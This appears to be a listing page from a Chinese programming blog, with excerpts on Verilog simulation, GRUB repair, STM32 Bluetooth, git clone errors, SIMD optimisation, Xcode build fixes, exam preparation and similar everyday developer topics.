3 建立ModelSim工程 3.1 修改目录 路径为刚才新建的tb文件夹。
3.2 新建工程 3.3 添加已有Verilog设计文件 3.4 建立TestBench 仿真文件 关闭上图界面，发现我们的工程中有以下两个文件，
4 编写TestBench文件并编译 `timescale 1ns/1ns
module not_gate_tb();
//Reg define
reg sys_clk;
reg sys_rst_n;
reg A;
//Wire define
wire Y;
initial begin
sys_clk =1'b0;
sys_rst_n=1'b0;
A =1'b0;
#200
sys_rst_n=1'b1;
A =1'b1;
#200
A =1'b0;
#200
A =1'b1;
end
always #10 sys_clk=~sys_clk;
not_gate u_not_gate(
.A (A),
.Y (Y)
);
endmodule
或者
选择编译全部，编译成功界面如下图所示，若出现错误，修稿tb文件，需要保存后再编译。
5 仿真 点击OK后会出现下图界面，若有不同，点击标签切换即可，无用的界面可关掉。若不小心关掉Wave界面，可点击View&gt;Wave，再次显现，此时Wave中无信号。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ea7c96595a9c79f8dea3c7e13a1781c2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/51165e633dc3bdc9c8e9b251e9e90bec/" rel="bookmark">
			IDEA启动项目Error:java: JDK isn‘t specified for module
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		分为两种情况：
情况一：是jdk问题 选择自己下载的jdk版本，而不是idea自带的
情况二：我遇到的，在jdk没有问题的情况下，在我对项目进行install打包是发现速度慢
是我的maven路径出现了问题
情况特殊，需要把maven路径转化为自己下载的maven路径
此时从新刷新项目恢复
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2ac17469ce8fe8d0ff380bdaaf43968f/" rel="bookmark">
			【服务器】Ubuntu重启后陷入GRUB 报错Minimal BASH like line editing is supported. For the first word
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一台塔式服务器，关机再开机后，莫名其妙陷入了GRUB
这是一台Windows、Ubuntu双系统的服务器
报错信息：
Minimal BASH like line editing is supported. For the first word, TAB lists possible command completions. anywhere else TAB lists possible device or file completions.
我折腾了好久，最终还是备份数据后重装了
不过下面是我找的一些解决办法：
方案1： Fixing “minimal BASH like line editing is supported” Grub error
https://itsfoss.com/fix-minimal-bash-line-editing-supported-grub-error-linux/
核心思路是通过sudo grub-install --boot-directory=/mnt/boot --bootloader-id=ubuntu --target=x86_64-efi --efi-directory=/mnt/boot/efi重装GRUB
过程中可能遇到的问题：Error “mount: mount point /mnt/boot/efi does not exist” when trying to reinstall grub
参考
https://askubuntu.com/questions/1237072/error-mount-mount-point-mnt-boot-efi-does-not-exist-when-trying-to-reinstallhttps://devicetests.com/fix-mount-point-error-reinstalling-grub-ubuntu
我重装了，重装之后确实能通过grub看到efi/ grubenv之类的，但是OS还是启动不起来
方案2： https://itsfoss.com/fix-minimal-bash-line-editing-supported-grub-error-linux/
核心思路是通过U盘启动盘中的Boot Repair工具。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2ac17469ce8fe8d0ff380bdaaf43968f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/75c9241b0f25fb939b80291a7cc47b38/" rel="bookmark">
			HC08蓝牙模块实现手机通信以及互相通信（附源码及解析）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言
本篇博客详细的介绍如何实现HC08主从机设置，命名，以及如何实现两个STM32通过HC08互相通信，并附带完整的操作步骤，以及源代码。
目录
一、HC08主从配置
1.1VOFA+的下载及基本用法
1.1.1VOFA+的下载 1.1.2VOFA+的基本用法 1.2配置HC08主从机及其他
二、两个STM32通过HC08互相通信
2.1硬件连接
2.2软件实现（附完整源码）
三.手机APP连接HC08
四.HC08的AT指令表
一、HC08主从配置 1.1VOFA+的下载及基本用法 1.1.1VOFA+的下载 VOFA+是一款非常简单好用的串口上位机软件，既可以监视波形调试参数，又可以发送串口指令，满足电赛控制题调试的一切需求，是未来拿下国一同学们的必备工具，官网下载链接如下：
下载中心 | VOFA-Plus上位机
图1是VOFA+的界面，一般只需要修改端口号与波特率，按照STM32配置的串口波特率修改即可。
图1 1.1.2VOFA+的基本用法 1.蓝色图标是启动按钮，成功连接后，接受发送来的串口数据，闪蓝色。
2.红色图标是协议与连接，在此界面设置串口参数配置，如图2。
图2 3.绿色图标界面设置串口指令，点击选择“命令”，如图3。
图3 4.成功生成“命令8”，选择编辑，可以修改名称和发送内容，编辑完成后，双击退出编辑，点击“命令8”控件，就可以发送“1234”了，如图4（未退出编辑模式），之后就需要用这个功能给HC08发送信息。
图4 1.2配置HC08主从机及其他 基本步骤：
1.利用USB转串口模块，将HC08物理连接电脑，并打开VOFA+真正与HC08串口通讯，波特率设置为9600（出厂默认波特率是9600，连接上后可以自定义）。
2.按照AT指令表，编辑VOFA+的命令工具，向HC08发送对应的AT指令。
注意：设置一个为主机，一个为从机，上电即可自动连接。HC08 支持一对一连接，第一次连接后，主机会自动记忆配对对象。如需连接其他模块，必须先清除配对记忆。主从机可以互发消息。（配对中HC08板载灯闪烁，连接成功板载灯常亮）
图5中，我的命令控件叫“设置主机”，发送的内容为“AT+ROLE=M”，查AT指令表（附文末）知该命令设置主机，设置从机则改M为S，“AT+ROLE=S”。
图5 图6中，我的命令控件叫“设置波特率”，发送的内容为懒得打了，如图所示，查表知该命令为设置HC08波特率，再次强调一下HC08出厂设置的波特率是9600。
图6 二、两个STM32通过HC08互相通信 2.1硬件连接 2.2软件实现（附完整源码） 实现思路：
1.实现两个STM32与HC08主从机串口通讯。
2.连从机的STM32与连主机的STM32互相发送信息，收到对应消息点亮的板载灯。
注意：两灯均被点亮说明，实现互相通讯，代码方面两个单片机的代码是一样的，接受中断函数，判断是否收到另一个单片机发送的字符‘a’，同时在main函数的while（1）里一直向另一个单片机发送字符‘a’，现象是先后上电后，两个32的板载灯几乎同时被点亮。
main文件
#include "stm32f10x.h" // Device header #include "Delay.h" #include "OLED.h" #include "HC08.h" int main(void) { HC08_Init();//初始化HC08串口 GPIO_InitTypeDef GPIO_InitStructure;//初始化板载灯B5 RCC_APB2PeriphClockCmd(RCC_APB2Periph_GPIOB|RCC_APB2Periph_GPIOE, ENABLE); GPIO_InitStructure.GPIO_Pin = GPIO_Pin_5;	GPIO_InitStructure.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/75c9241b0f25fb939b80291a7cc47b38/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e1e26bdc51f3ba373f9321a8720ca915/" rel="bookmark">
			如何使用命令拉取指定git分支
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用git clone 遇见git did not exit cleanly (exit code 128)
使用Git Bash Here拉取，报错提示：fetch-pack invalid index-pack output
只需要，点击Git Bash Here，输入：git clone -b 分支名 --depth=1 git仓库地址（http://xxx.git）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fd88570d95436867fa9644a6565d9328/" rel="bookmark">
			矩阵转置向量优化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题描述 使用simd向量优化转置算子
如果我们要对 n ∗ n n*n n∗n的矩阵 m m m实现转置，可以用以下代码实现
for (int i = 0; i &lt; n; i++) { for (int j = 0; j &lt; n; j++) { m_out[i][j] = m[j][i]; } } 不考虑cache的局部性原理的话，需要 n 2 n^2 n2次访存去读数据以及 n 2 n^2 n2次访存去写数据，而在使用simd向量对计算进行优化时，每次load的数据块是连续的，无法将不连续的数据块一次访存load为一个向量，因此我们可以使用向量的平移和翻转操作间接的实现矩阵的转置操作。
向量平移
simd_concat
也可以视为是向量的拼接操作，比如1 2 3 4右移一位得到2 3 4 1
向量翻转
simd_seleq
也就是向量的选择操作，可以实现对两个向量指定位置的翻转，比如a={1,2,3,4}，b={5,6,7,8}，翻转第一个和第三个位置可以得到a={5,2,7,4}，b={1,6,3,8}。
注：不同编译器使用的平移和翻转指令名称可能不同，往往需要两条simd_seleq指令才能实现两个向量的交换操作，下文为了说明方便统一将两次simd_seleq指令记为一次翻转操作。
以4*4的矩阵转置操作为例
1 5 9 13 1 2 3 4 2 6 10 14 --&gt; 5 6 7 8 3 7 11 15 9 10 11 12 4 8 12 16 13 14 15 16 平移操作可以使元素在行内位置发生改变，翻转操可以试元素所在行号发生改变。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fd88570d95436867fa9644a6565d9328/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/74b324ab3066a696adc6816725b25c6e/" rel="bookmark">
			git clone拉去分支拉不下来，命令也报错
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		git clone项目报错fatal: fetch-pack: invalid index-pack output问题解决 原因 出现该问题的原因是git clone的项目过大导致项目拉去失败
解决方法 首先拉去项目最后一次提交 git clone --depth=1 项目地址；
拉取全部项目内容 git fetch --unshallow , 一般不大的项目都可以拉取下来了；
如果步骤2还是报错 fatal: fetch-pack: invalid index-pack output ，那么可以进入项目目录执行 git fetch --depth=100(如果还是报错那就把数字调小)，执行多次每次增加一段；
例如：
git fetch --depth=100 git fetch --depth=200 git fetch --depth=500 git fetch --depth=1000 步骤3执行完成后执行 git fetch --unshallow 拉取全量分支信息，如果报错 fatal: –unshallow on a complete repository does not make sense, 则执行git config remote.origin.fetch "+refs/heads/*:refs/remotes/origin/*"命令增加git的orgin仓库的全部分支映射 5.最后执行 git fetch -pv拉取全部分支
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ab508d984dd9be74ec0fa171ec37d07f/" rel="bookmark">
			【NLP】培训LLM的不同方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在大型语言模型（LLM）领域，存在多种具有不同手段、要求和目标的培训机制。由于它们有不同的用途，因此重要的是不要将它们相互混淆并了解它们适用的不同场景。
在本文中，我想概述一些最重要的训练机制，包括预训练、微调、人类反馈强化学习 (RLHF)和适配器。此外，我将讨论提示的作用，提示本身不被认为是一种学习机制，并阐明提示调整的概念，它在提示和实际训练之间架起了一座桥梁。
预训练 预训练是最基本的训练方式，与您所知道的其他机器学习领域的训练相同。在这里，您从未经训练的模型（即具有随机初始化权重的模型）开始，并训练以在给定一系列先前标记的情况下预测下一个标记。为此，从各种来源收集大量句子，并将其分成小块提供给模型。
这里采用的训练模式称为自我监督。从正在训练的模型的角度来看，我们可以说是监督学习方法，因为模型在做出预测后总是得到正确的答案。例如，给定序列“我喜欢冰”……模型可能会预测“锥体”作为下一个单词，然后可能会被告知答案是错误的，因为实际的下一个单词是“奶油”。最终，可以计算损失并调整模型权重以更好地预测下一次。称之为自监督（而不是简单的监督）的原因是，不需要预先通过昂贵的过程收集标签，但它们已经包含在数据中。给定句子“我喜欢冰淇淋”，​​我们可以自动将其拆分为“我喜欢冰”作为输入， “奶油”作为标签，这不需要人工干预。尽管这不是模型本身，但它仍然由机器自动执行，因此人工智能在学习过程中自我监督的想法。
最终，通过对大量文本进行训练，模型学会了对一般语言结构进行编码（例如，它学习到，我喜欢后面可以跟名词或分词）以及文本中包含的知识。锯。例如，据了解， “乔·拜登是……”这句话后面经常跟着美国总统，因此代表了该知识。
其他人已经完成了这种预训练，您可以使用开箱即用的模型，例如 GPT。但是，为什么要训练类似的模型呢？如果您使用的数据具有类似于语言的属性，但它本身不是通用语言，那么从头开始训练模型就变得很有必要。乐谱就是一个例子，它的结构有点像语言。关于哪些部分可以相互遵循有一定的规则和模式，但是接受过自然语言训练的法学硕士无法处理此类数据，因此您必须训练一个新模型。然而，由于乐谱和自然语言之间有许多相似之处，法学硕士的架构可能是合适的。
微调 尽管预训练的 LLM 由于其编码的知识而能够执行各种数量的任务，但它有两个主要缺点，即其输出的结构以及缺乏未编码在数据中的知识首先。
如您所知，LLM 总是根据之前给定的标记序列来预测下一个标记。对于继续给定的故事可能没问题，但在其他情况下这不是您想要的。如果您需要不同的输出结构，有两种主要方法可以实现。您可以以这样的方式编写提示，即模型预测下一个标记的惰性能力可以解决您的任务（这称为提示工程），或者您可以更改最后一层的输出，使其反映您的任务，就像您在任何其他机器学习模型。考虑一个分类任务，其中有N个类。通过即时工程，您可以指示模型始终在给定输入后输出分类标签。通过微调，您可以将最后一层更改为具有N 个输出神经元，并从具有最高激活的神经元导出预测类别。
LLM的另一个限制在于其训练数据。由于数据源相当丰富，最著名的法学硕士编码了大量的常识。因此，他们可以告诉您有关美国总统、贝多芬的主要著作、量子物理学的基础知识以及西格蒙德·弗洛伊德的主要理论等信息。然而，有些领域是模型不了解的，如果您需要使用这些领域，微调可能与您相关。
微调的想法是采用已经预训练的模型并使用不同的数据继续训练，并在训练过程中仅更改最后一层的权重。这仅需要初始训练所需资源的一小部分，因此可以更快地执行。另一方面，模型在预训练期间学习的结构仍然被编码在第一层中并且可以被利用。假设您想向模型传授您最喜欢的但鲜为人知的奇幻小说，这些小说尚未成为训练数据的一部分。通过微调，您可以利用模型有关自然语言的知识来使其理解奇幻小说的新领域。
RLHF 微调 微调模型的一个特殊情况是根据人类反馈进行强化学习 (RLHF)，这是 GPT 模型和 Chat-GPT 等聊天机器人之间的主要区别之一。通过这种微调，模型被训练为产生人类在与模型对话中最有用的输出。
主要思想如下：给定任意提示，为该提示生成模型的多个输出。人们根据他们认为这些输出的有用性或适当性对这些输出进行排名。给定四个样本 A、B、C 和 D，人们可能会认为 C 是最佳输出，B 稍差但等于 D，A 是该提示的最差输出。这将导致顺序 C &gt; B = D &gt; A。接下来，该数据用于训练奖励模型。这是一个全新的模型，它通过给予反映人类偏好的奖励来学习对法学硕士的输出进行评分。一旦奖励模型经过训练，它就可以替代该产品中的人类。现在，模型的输出由奖励模型进行评级，并且该奖励作为反馈提供给 LLM，然后进行调整以最大化奖励；与 GAN 的想法非常相似。
正如您所看到的，这种训练需要人工标记的数据，这需要相当多的努力。然而，所需的数据量是有限的，因为奖励模型的想法是从该数据中进行概括，以便一旦它了解了自己的部分，就可以自行对 llm 进行评分。RLHF 通常用于使 LLM 输出更像对话或避免不良行为，例如模型刻薄、侵入性或侮辱性。
Adapters 两种适配器可插入现有网络。图片取自https://arxiv.org/pdf/2304.01933.pdf。
在前面提到的微调中，我们在最后一层中调整了模型的一些参数，而前面层中的其他参数保持不变。不过，还有一种替代方案，即通过较少数量的训练所需参数来保证更高的效率，这称为dapters。
使用适配器意味着向已经训练的模型添加额外的层。在微调过程中，仅训练那些适配器，而模型的其余参数根本不改变。然而，这些层比模型附带的层小得多，这使得调整它们变得更容易。此外，它们可以插入到模型中的不同位置，而不仅仅是最后。在上图中您可以看到两个示例；一种是适配器以串行方式添加为一层，另一种是并行添加到现有层。
Prompting 您可能想知道提示是否算作训练模型的另一种方式。提示意味着在实际模型输入之前构建指令，特别是如果您使用少样本提示，您可以在提示中向 LLM 提供示例，这与训练非常相似，训练也包含呈现给模型的示例。模型。然而，提示不同于训练模型是有原因的。首先，从简单的定义来看，我们只在权重更新时才谈论训练，而在提示期间不会这样做。创建提示时，您不会更改任何模型，不会更改权重，不会生成新模型，也不会更改模型中编码的知识或表示。提示应该被视为指导法学硕士并告诉它你想从中得到什么的一种方式。以以下提示为例：
"""Classify a given text regarding its sentiment. Text: I like ice cream.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ab508d984dd9be74ec0fa171ec37d07f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0b65dda1e0e43f2a33150a9e05a2c536/" rel="bookmark">
			Missing file libarclite_iphoneos.a 问题解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题 在Xcode 运行项目会报以下错误
File not found: /Applications/Xcode-beta.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/lib/arc/libarclite_iphoneos.a 解决方案 打开URL https://github.com/kamyarelyasi/Libarclite-Files ，下载libarclite_iphonesimulator.a 文件至本地文件目录
终端添加
直接下载libarclite_iphoneos文件，放到以上路径下面
cd /Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/lib/ sudo mkdir arc cd arc sudo git clone https://github.com/kamyarelyasi/Libarclite-Files.git . 终端修改这个目录可能会遇到没有权限的情况，可以通过sudo chmod +x添加权限
手动添加
打开 Mac 上的 Finder 应用程序，在菜单中找到前往 -&gt; 前往文件夹 输入以下地址，然后前往
/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/lib 在该目录下面查看是否有arc文件夹，如果没有该文件夹，则新建文件夹，命名为arc
将下载好的libarclite_iphonesimulator.a 文件，手动拷贝到arc 文件夹下面
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/23303d3a7127d5364ceca96e0a55b920/" rel="bookmark">
			Windows 不能在本地计算机 启动 DmServiceDMSERVER。有关更多信息，查阅系统事件日志。如果这是非 Microsoft 服务，请与服务厂商联系，并参考持定服务错误代码-107
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		环境WINDOWS 在服务启动本地的达梦数据库时，发生了错误
找到日志 \dmdbms\log\dm_DMSERVER_202311.log里，发现超出内存了
解决方法 找到dmdbms\data\DAMENG\dm.ini
文件里面有个参数叫BUFFER，因为设置得太大了不能申请到足够的系统内存，把它调小就可以启动数据库了。
修改保存好后，使用命令开启达梦数据库的服务
然后关闭这个cmd窗口，在“开始”菜单栏中找到DM服务查看器，将其中的DmAPService和DmServiceDMSERVER脚本先后启动
没有关闭的话会发生下面的情况
启动完就可以正常连接了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bf998be8b782a2e88a9defffede543d4/" rel="bookmark">
			【KEIL5仿真】逻辑分析仪观察GPIO端口的输出波形
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1&gt;打开逻辑分析仪 打开后效果如下
2&gt;添加GPIO端口 1.点击红框内setup
2.点击方框内的红框
3.输入GPIO端口的序号，以PA6为例，输入PORTA.6
4.Display Type选择Bit
5.点击Close
3&gt;仿真运行 1.点击run按钮
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/050f49d9adc1dfc5154e7c094ce764dc/" rel="bookmark">
			面向对象和面向过程的编程语言
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		解释：所谓面向对象语言，简单理解就是所有操作都是通过对象来进行的
与面向过程语言的比较：
面向过程：指我们的程序逻辑分解为一个一个的步骤，通过对每个步骤的
抽象，来完成程序
-例子（孩子上学）：
妈妈起床，妈妈上厕所，妈妈洗漱，妈妈做早饭，妈妈叫孩子起床，孩子洗漱，孩子上学
面向过程 特点： 1.面向过程的编程思想将一个功能分解为一个小的步骤 2.我们通过完成一个一个的小步骤来完成一个程序 3.这种方式，符合我们的思维（先干啥，然后干啥，最后干啥），符合我们人类的思
维，编写起来相对比较简单
缺点：
但是这种方式往往只能适用一个功能，如果要实现别的功能，即使功能相差极小，也往
往要重新编写代码，所以它可复用性比较低，并且难以维护·
面向对象 特点：
1.面向对象语言关注的是对象，而不关注过程
2.对于面向对象语言来说，一切都是对象
3.将所有功能统一保存到对象中
如以上孩子上学例子：将妈妈功能保存到妈妈对象中，孩子功能保存到孩子对象中，要
使用哪个功能直接找到对应的对象即可
缺点：
1.这种方式编写的代码，比较容易阅读，并且比较易于维护，容易复用。
2.这种方式的编写，不太符合常规思维，编写起来稍微麻烦一点
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/94e1bf038958cd2928ff28487a4276bb/" rel="bookmark">
			LeetCode_Boyer-Moore 投票算法_中等_229.求众数 II
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 1.题目2.思路3.代码实现（Java） 1.题目 给定一个大小为 n 的整数数组，找出其中所有出现超过 ⌊ n/3 ⌋ 次的元素。
进阶：尝试设计时间复杂度为 O(n)、空间复杂度为 O(1)的算法解决此问题。
示例 1：
输入：[3,2,3]
输出：[3]
示例 2：
输入：nums = [1]
输出：[1]
示例 3：
输入：[1,1,1,3,3,2,2,2]
输出：[1,2]
提示：
1 &lt;= nums.length &lt;= 5 * 104
-109 &lt;= nums[i] &lt;= 109
来源：力扣（LeetCode）
链接：https://leetcode-cn.com/problems/majority-element-ii
2.思路 （1）哈希表
创建一个哈希表 hashMap，其中键 / 值为nums中的整数 / 该整数目前出现的次数，再创建一个保存结果的动态数组 res；遍历数组 nums，使用 put() 函数将当前整数nums[i]以及它目前出现的次数当作键值对添加到 hashMap 中（如果之前有添加过相同的Key，put() 方法会用新值替换旧值）；使用 get() 获取当前整数出现的次数，如果次数大于 nums.length/3 且 res 中没有该整数，则将其添加到 res 中，并继续遍历。遍历数组 nums 结束后最后返回 res 即可。 （2）Boyer-Moore 投票算法
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/94e1bf038958cd2928ff28487a4276bb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/97b35bd0fa3dbec5d465420c81ef0844/" rel="bookmark">
			如何准备软考-软件设计师(下)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言： 下午的题目一般有6道题目，前4题是必答题，第5题和第6题二选一。每题15分，一共75分，45分即可通过。
接下来，我们以2022下半年软件设计师案例来当作教材来讲，下午的每种类型的题目该如何去解决。
一.数据流图解析 题目 【说明】
随着新能源车数量的迅猛增长，全国各地电动汽车配套充电桩急速增长，同时也带来了充 电桩计量准确性的问题。充电桩都需要配备相应的电能计量和电费计费功能，需要对充电计量准确性强制进行检定。现需开发计量检定云端软件，其主要功能是:
(1)数据接收。接收计量装置上报的充电数据，即充电过程中电压、电流、电能等充电监测 数据和计量数据(充电监测数据为充电桩监测的数据，计量数据为计量装置计量的数据，以 秒为间隔单位)，接收计量装置心跳数据，并分别进行存储。
(2)基础数据维护。管理员对充电桩、计量检定装置等基础数据进行维护。
(3)数据分析。实现电压、电流、电能数据的对比，进行误差分析，记录充电桩的充电误差， 供计量装置检定。系统根据计量检测人员给出的查询和统计条件展示查询统计结果。
(4)充电桩检定。分析充电误差:计量检测人员根据误差分析结果和检定信息记录，对充电桩进行检定，提交检定结果:系统更新充电桩中的检定信息(检定结果和检定时间)，并存 储于检定记录。
(5)异常告警。检测计量装置心跳，当心跳停止时，向管理员发出告警。
(6)检定信息获取，供其它与充电桩相关的第三方服务查询充电桩中的检定信息。 现采用结构化方法对计量检定云端软件进行分析与设计，获得如图 1-1 所示的上下文数据 流图和图 1-2 所示的 0 层数据流图。
【问题 1】(4 分)
使用说明中的词语，给出图 1-1 中的实体 E1~E4 的名称。
【问题 2】(5 分)
使用说明中的词语，给出图 1-2 中的数据存储 D1~D5 的名称。
【问题 3】(4 分)
根据说明中的词语，补充图 1-2 中缺失的数据流及其起点和终点。
【问题 4】(2 分) 根据说明，给出“充电监测与计量数据”数据流的组成。
解析： 问题1(4 分) 问：使用说明中的词语，给出图 1-1 中的实体 E1~E4 的名称。
解析数据流的题，首先先看问题1中E对应的民称，然后在回头看题目，前两道题一般都是比较简单的。E的名称，我们可以带着几个疑问去回头阅读描述：
E1的话，我们可以带着以下几个疑问从描述中查找
1.心跳数据由谁上报？
2.计量数据由谁上报？
则很容易得出E1：计量装置。
E2的话，我们可以带着以下几个疑问从描述中查找
1.告警信息通知给谁？
2.谁录入的基础数据？
则很容易得出E2：管理员。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/97b35bd0fa3dbec5d465420c81ef0844/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/086dd5a02c546665fb0bae50a71081f4/" rel="bookmark">
			深信服技术认证“SCSA-S”划重点：信息收集
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		为帮助大家更加系统化地学习网络安全知识，以及更高效地通过深信服安全服务认证工程师考核，深信服特别推出“SCSA-S认证备考秘笈”共十期内容，“考试重点”内容框架，帮助大家快速get重点知识~
划重点来啦
深信服安全服务认证工程师（SCSA-S），定位于普适性的安全服务技术，适合在校生、应届毕业生或具备0-3年工作经验的网络安全工程师。该认证包含网络安全法律法规、操作系统基础、计算机网络基础、渗透测试基础、漏洞扫描、信息收集、WEB漏洞挖掘、安全事件处置等课程内容，侧重考核网络安全服务相关知识，评估网络安全实战型人才。
学习并获得SCSA-S认证后，可以具备识别网络威胁和安全事件、收集、整理、管理威胁信息、漏洞扫描与验证，漏洞分类分级、针对WEB系统进行脆弱性测试和渗透性测试等能力。
深信服技术认证SCSA-S样证
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/268d394edc563740c4556c6d0fd5756c/" rel="bookmark">
			Visdrone转为YOLO格式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		import os from pathlib import Path from ultralytics.utils.downloads import download def visdrone2yolo(dir_path): dir = Path(dir_path) from PIL import Image from tqdm import tqdm def convert_box(size, box): # Convert VisDrone box to YOLO xywh box dw = 1. / size[0] dh = 1. / size[1] return (box[0] + box[2] / 2) * dw, (box[1] + box[3] / 2) * dh, box[2] * dw, box[3] * dh (dir / 'labels').mkdir(parents=True, exist_ok=True) # make labels directory pbar = tqdm((dir / 'annotations').
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/268d394edc563740c4556c6d0fd5756c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2fd304746d5074830016008abd0125f8/" rel="bookmark">
			java 泛型返回
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		@ApiOperation("获取服务订单详情") @GetMapping("getServiceOrderDetail") public &lt;T&gt; T getServiceOrderDetail( @ApiParam(required = true, value = "服务类型") @RequestParam String QRCodeType, @ApiParam(required = true, value = "服务ID") @RequestParam String businessId) { return orderServiceService.getServiceOrderDetail(QRCodeType, businessId); } /** * 获取服务详情 */ &lt;T&gt; T getServiceOrderDetail(String qrCodeType, String businessId); @Override public &lt;T&gt; T getServiceOrderDetail(String qrCodeType, String businessId) { OrderCheckoutStrategy checkoutStrategy = OrderCheckoutStrategyFactory.getOrderCheckoutStrategy(qrCodeType); return checkoutStrategy.getOrderDetail(businessId); } public interface OrderCheckoutStrategy { &lt;T&gt; T getOrderDetail(String businessId); } @Override public &lt;T&gt; T getOrderDetail(String businessId) { //查询用户卡券是否符合核销要求 // BaseUserCardDTO baseUserCardDTO = userExport.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2fd304746d5074830016008abd0125f8/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/41/">«</a>
	<span class="pagination__item pagination__item--current">42/321</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/43/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>